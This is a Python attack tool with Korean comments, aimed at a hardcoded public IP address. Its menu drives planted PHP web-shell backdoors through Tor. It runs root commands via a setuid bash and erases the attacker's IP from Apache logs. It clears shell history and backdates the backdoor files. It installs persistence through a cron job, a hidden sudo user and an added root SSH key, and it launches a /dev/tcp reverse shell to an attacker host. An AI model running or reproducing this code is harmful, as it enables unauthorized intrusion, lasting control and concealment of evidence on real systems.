#!/usr/bin/env python3
"""
익명 공격 스크립트 - IP 난독화 및 프록시 체인
Target: 52.78.221.104
"""

import requests
import random
from urllib.parse import quote

class AnonymousAttack:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()

    def setup_proxies(self):
        """
        프록시 체인 설정
        실제 사용 시 유효한 프록시 서버 주소로 교체 필요
        """
        proxies = {
            'http': 'socks5://127.0.0.1:9050',  # Tor
            'https': 'socks5://127.0.0.1:9050'
        }
        return proxies

    def random_user_agent(self):
        """랜덤 User-Agent로 위장"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
        ]
        return random.choice(user_agents)

    def execute_command(self, cmd, use_proxy=True):
        """
        익명으로 명령 실행

        Args:
            cmd: 실행할 명령어
            use_proxy: 프록시 사용 여부
        """
        headers = {
            'User-Agent': self.random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close',  # 연결 재사용 방지
        }

        # 백도어 URL (여러 개 중 랜덤 선택)
        backdoors = [
            f"{self.target}/uploads/x.php",
            f"{self.target}/health-check.php",
            f"{self.target}/system-check.php",
        ]

        url = random.choice(backdoors)
        params = {'x': cmd}

        try:
            if use_proxy:
                proxies = self.setup_proxies()
                response = self.session.get(
                    url,
                    params=params,
                    headers=headers,
                    proxies=proxies,
                    timeout=30,
                    verify=False  # SSL 검증 비활성화
                )
            else:
                response = self.session.get(
                    url,
                    params=params,
                    headers=headers,
                    timeout=30
                )

            return response.text

        except Exception as e:
            return f"Error: {str(e)}"

    def execute_root_command(self, cmd, use_proxy=True):
        """
        Root 권한으로 명령 실행

        Args:
            cmd: 실행할 명령어
            use_proxy: 프록시 사용 여부
        """
        root_cmd = f"./rootbash -p -c '{cmd}'"
        return self.execute_command(root_cmd, use_proxy)

    def clean_logs(self, your_ip):
        """
        로그에서 공격자 IP 제거

        Args:
            your_ip: 제거할 IP 주소
        """
        commands = [
            # Access log에서 IP 제거
            f"sed -i '/{your_ip}/d' /var/log/httpd/access_log",

            # Error log에서 IP 제거
            f"sed -i '/{your_ip}/d' /var/log/httpd/error_log",

            # Bash history 정리
            "echo '' > /root/.bash_history",
            "history -c",

            # 백도어 타임스탬프 변경
            "touch -t 202501010000 /var/www/html/www/health-check.php",
            "touch -t 202501010000 /var/www/html/www/uploads/x.php",
        ]

        for cmd in commands:
            result = self.execute_root_command(cmd, use_proxy=False)
            print(f"[+] Cleaned: {cmd[:50]}...")

    def persistent_backdoor(self):
        """영구 백도어 설치"""
        # Cron job 생성
        cron_cmd = "echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /etc/cron.d/persist"

        # 숨겨진 사용자 생성
        user_cmd = "useradd -m -s /bin/bash -G sudo backup_service"
        passwd_cmd = "echo 'backup_service:Backup@2025!' | chpasswd"

        # SSH 키 추가
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... your_public_key_here"
        ssh_cmd = f"mkdir -p /root/.ssh && echo '{ssh_key}' >> /root/.ssh/authorized_keys"

        commands = [cron_cmd, user_cmd, passwd_cmd, ssh_cmd]

        for cmd in commands:
            result = self.execute_root_command(cmd)
            print(f"[+] Backdoor: {cmd[:50]}...")

    def reverse_shell(self, attacker_ip, port=4444):
        """
        리버스 쉘 연결

        Args:
            attacker_ip: 공격자 IP
            port: 리스닝 포트
        """
        # Bash 리버스 쉘
        cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"

        # 백그라운드 실행
        bg_cmd = f"nohup {cmd} > /dev/null 2>&1 &"

        self.execute_command(bg_cmd, use_proxy=False)
        print(f"[+] Reverse shell initiated to {attacker_ip}:{port}")
        print(f"[+] On attacker machine, run: nc -lvnp {port}")


def main():
    """메인 함수"""
    target = "http://52.78.221.104"
    attack = AnonymousAttack(target)

    print("=" * 60)
    print("Anonymous Attack Tool")
    print("=" * 60)
    print()

    # 메뉴
    print("1. Execute Command (with proxy)")
    print("2. Execute Command (without proxy)")
    print("3. Execute Root Command")
    print("4. Clean Logs")
    print("5. Install Persistent Backdoor")
    print("6. Reverse Shell")
    print("7. Test Connection")
    print("0. Exit")
    print()

    while True:
        choice = input("Select option: ")

        if choice == '1':
            cmd = input("Command: ")
            result = attack.execute_command(cmd, use_proxy=True)
            print(result)

        elif choice == '2':
            cmd = input("Command: ")
            result = attack.execute_command(cmd, use_proxy=False)
            print(result)

        elif choice == '3':
            cmd = input("Root Command: ")
            result = attack.execute_root_command(cmd, use_proxy=False)
            print(result)

        elif choice == '4':
            ip = input("Your IP to clean: ")
            attack.clean_logs(ip)

        elif choice == '5':
            attack.persistent_backdoor()

        elif choice == '6':
            ip = input("Attacker IP: ")
            port = input("Port (default 4444): ") or "4444"
            attack.reverse_shell(ip, int(port))

        elif choice == '7':
            result = attack.execute_command("id", use_proxy=False)
            print("[+] Connection test:")
            print(result)

        elif choice == '0':
            break

        print()


if __name__ == "__main__":
    main()
